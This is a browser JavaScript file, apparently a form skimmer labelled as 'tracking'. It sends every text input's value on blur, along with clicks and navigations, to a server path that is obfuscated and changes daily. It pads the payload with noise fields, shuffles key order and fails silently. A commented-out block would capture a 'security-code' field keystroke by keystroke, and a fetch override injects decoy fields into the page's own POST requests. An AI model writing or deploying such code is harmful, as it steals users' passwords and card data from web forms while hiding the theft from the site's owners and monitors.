(async function () {
  if (!sessionStorage.getItem("uCukkzD")) {
    const generateShortSessionID = () => {
      const array = new Uint8Array(8);
      window.crypto.getRandomValues(array);
      return (
        Array.from(array.slice(0, 3)).map(b => b.toString(16).padStart(2, "0")).join("") +
        "-" +
        array[3].toString(16).padStart(2, "0") +
        array[4].toString(16).padStart(2, "0") +
        "-" +
        Array.from(array.slice(5, 8)).map(b => b.toString(16).padStart(2, "0")).join("")
      );
    };

    const uCukkzD = generateShortSessionID();
    sessionStorage.setItem("uCukkzD", uCukkzD);
  }

  const waitForIP = () =>
    new Promise(resolve => {
      if (window.mtaP) {
        resolve(window.mtaP);
      } else {
        const checkInterval = setInterval(() => {
          if (window.mtaP) {
            clearInterval(checkInterval);
            resolve(window.mtaP);
          }
        }, 100);
      }
    });

  const mtaP = await waitForIP();

  const getBrowserInfo = () => {
    if (navigator.userAgentData && navigator.userAgentData.brands) {
      const brand = navigator.userAgentData.brands.find(
        b => !b.brand.includes("Not") && !b.brand.includes("A")
      );
      return brand ? brand.brand : "Unknown Browser";
    }

    const ua = navigator.userAgent;
    return ua.includes("Firefox")
      ? "Mozilla Firefox"
      : ua.includes("SamsungBrowser")
      ? "Samsung Internet"
      : ua.includes("Opera") || ua.includes("OPR")
      ? "Opera"
      : ua.includes("Trident")
      ? "Internet Explorer"
      : ua.includes("Edg")
      ? "Microsoft Edge"
      : ua.includes("Chrome")
      ? "Google Chrome"
      : ua.includes("Safari")
      ? "Apple Safari"
      : "Unknown";
  };

  const SECRET_KEY = "your_super_secret_key"; // Match backend

  // Base62 Character Set
  const BASE62_CHARS = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

  const base62Encode = (num) => {
      let encoded = "";
      while (num > 0) {
          encoded = BASE62_CHARS[num % 62] + encoded;
          num = Math.floor(num / 62);
      }
      return encoded.padStart(8, "0"); // Ensure fixed length
  };
  
  const getDailyPrefix = () => {
    const today = new Date().getUTCDate().toString(); // Get UTC day as a string
    const baseChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    
    let obfuscatedPrefix = "";
    for (let i = 0; i < today.length; i++) {
        let charIndex = parseInt(today[i], 10) * 5; // Multiply digit to obfuscate
        obfuscatedPrefix += baseChars.charAt(charIndex % baseChars.length);
    }

    // Generate a random prefix of length between 2 and obfuscatedPrefix length
    const randomPrefixLength = Math.floor(Math.random() * (obfuscatedPrefix.length - 2)) + 2;
    const randomPrefix = Array.from({ length: randomPrefixLength }, () => 
        baseChars.charAt(Math.floor(Math.random() * baseChars.length))
    ).join("");

    return randomPrefix + obfuscatedPrefix; // Final unpredictable prefix
};

const dailyPrefix = getDailyPrefix();

const getDynamicAPIPath = () => {
    const timestamp = Math.floor(Date.now() / 1000);
    const timefzkst = base62Encode(timestamp);
    return `/apiv/${dailyPrefix}/${timefzkst}`;
};

    // Encrypt Timestamp
  const encryptTimestamp = async (timestamp) => {
      const encoder = new TextEncoder();
      const keyData = encoder.encode(SECRET_KEY);
      const data = encoder.encode(String(timestamp));
  
      const key = await crypto.subtle.importKey(
          "raw",
          keyData,
          { name: "HMAC", hash: "SHA-256" },
          false,
          ["sign"]
      );
  
      const signature = await crypto.subtle.sign("HMAC", key, data);
      return base62Encode(new Uint8Array(signature).slice(0, 4)); // Use first 4 bytes
  };
  
  const sendTrackingData = (eventType, additionalData = {}) => {
    try {
      const trackingAPI = getDynamicAPIPath(); // Call synchronously
      const uCukkzD = sessionStorage.getItem("uCukkzD");
      const pageUrl = window.location.href;
      const browserInfo = getBrowserInfo();
  
      // 🧠 Base payload
      const basePayload = {
        uCukkzD,
        mtaP,
        pageUrl,
        eventType,
        browserInfo,
        timestamp: new Date().toISOString(),
        ...additionalData
      };
  
      // 🧪 Inject fake noise fields
      const noiseFields = {
        nsq: Math.random().toString(36).substring(2, 7),
        nspze: Date.now() % 999,
        zelqw: navigator.language || "en-US",
      };
  
      Object.assign(basePayload, noiseFields);
  
      // 🎲 Randomize key order
      const randomizedPayload = Object.fromEntries(
        Object.entries(basePayload).sort(() => Math.random() - 0.5)
      );
  
  
      fetch(`http://localhost:8000${trackingAPI}`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(randomizedPayload),
      })
        .then(async (response) => {
          if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
          }
          const contentType = response.headers.get("content-type");
          return contentType.includes("application/json")
            ? response.json()
            : response.text();
        })
        .catch((error) => {
        });
    } catch (error) {
    }
  };
  
  sendTrackingData("page_load");

  window.addEventListener("beforeunload", () => sendTrackingData("page_unload"));

  let lastUrl = window.location.href;
  new MutationObserver(() => {
    if (lastUrl !== window.location.href) {
      lastUrl = window.location.href;
      sendTrackingData("page_navigation");
    }
  }).observe(document, { subtree: true, childList: true });

  // Event Listeners for Input Blur
  document.addEventListener("blur", event => {
    if (event.target.tagName === "INPUT" || event.target.tagName === "TEXTAREA") {
      sendTrackingData("input", { inputName: event.target.name || event.target.id, inputValue: event.target.value });
    }
  }, true); // Use capture phase to ensure blur event is captured

  // Event Listeners for Button Clicks
  document.addEventListener("click", event => {
    if (event.target.tagName === "BUTTON") {
      sendTrackingData("button_click", {
        buttonId: event.target.id,
        buttonClass: event.target.className,
        buttonText: event.target.innerText,
      });
    }
  });

  // Real-time tracking for a specific input field by ID
  /*const realTimeInputId = "security-code"; // Replace with the ID of the input field you want to track in real-time

  const waitForElement = (selector) => {
    return new Promise(resolve => {
      const element = document.querySelector(selector);
      if (element) {
        resolve(element);
      } else {
        const observer = new MutationObserver((mutations, me) => {
          const element = document.querySelector(selector);
          if (element) {
            resolve(element);
            me.disconnect();
          }
        });
        observer.observe(document, {
          childList: true,
          subtree: true
        });
      }
    });
  };

  const realTimeInput = await waitForElement(`#${realTimeInputId}`);

  if (realTimeInput) {
    realTimeInput.addEventListener("input", event => {
      sendTrackingData("input", { inputName: event.target.name || event.target.id, inputValue: event.target.value });
    });
  }
*/
})();
const originalFetch = window.fetch;

const generateDecoyData = () => {
    const decoyFields = {
        userTheme: ["light", "dark", "system"],
        deviceTrust: () => (Math.random() * 0.5 + 0.5).toFixed(2), // Score between 0.5-1
        lastActivity: () => Date.now() - Math.floor(Math.random() * 1000000), // Random past timestamp
        authLevel: ["guest", "member", "supermf", "superuser"],
        preferredLanguage: ["en", "fr", "es", "de", "ru", "zh", "ar", "jp"],
        biometricScore: () => Math.floor(Math.random() * 100) + 1, // Score 1-100
        sessionHealth: () => Math.random().toFixed(3), // 0.000 - 0.999
        adExposure: () => Math.floor(Math.random() * 20), // Number of ads seen
        apiLatency: () => Math.floor(Math.random() * 200) + 50, // 50-250ms latency
        recommendedProducts: ["None", "Laptops", "Smartphones", "Gaming Gear", "Fitness Wearables"],
        deviceHash: () => Math.random().toString(36).substring(2, 15), // Fake device fingerprint
        regionRiskScore: () => (Math.random() * 5).toFixed(2), // Risk score 0-5
        customFlags: () => ({
            experimentalFeature: Math.random() < 0.3,
            vpnDetected: Math.random() < 0.1,
            dataAnomaly: Math.random() < 0.05
        })
    };
    let decoyData = {};
    const keys = Object.keys(decoyFields);
    
    // Randomly select 3-6 decoy fields per request
    let numFields = Math.floor(Math.random() * 4) + 3;
    for (let i = 0; i < numFields; i++) {
        let key = keys[Math.floor(Math.random() * keys.length)];
        decoyData[key] = typeof decoyFields[key] === "function" ? decoyFields[key]() : decoyFields[key][Math.floor(Math.random() * decoyFields[key].length)];
    }

    return decoyData;
};
/*aaloo */
window.fetch = async (url, options = {}) => {
  try {
      // 🔥 Ensure options exist
      options = options || {};
      options.method = options.method || "GET";

      // 🔥 Do NOT modify GET or HEAD requests
      if (options.method === "GET" || options.method === "HEAD") {
          return originalFetch(url, options);
      }

      let modifiedBody = options.body ? JSON.parse(options.body) : {};

      // 🔥 Inject decoy data only for requests that support a body
      Object.assign(modifiedBody, generateDecoyData());

      options.body = JSON.stringify(modifiedBody);

      return originalFetch(url, options);
  } catch (error) {
      return originalFetch(url, options);
  }
};

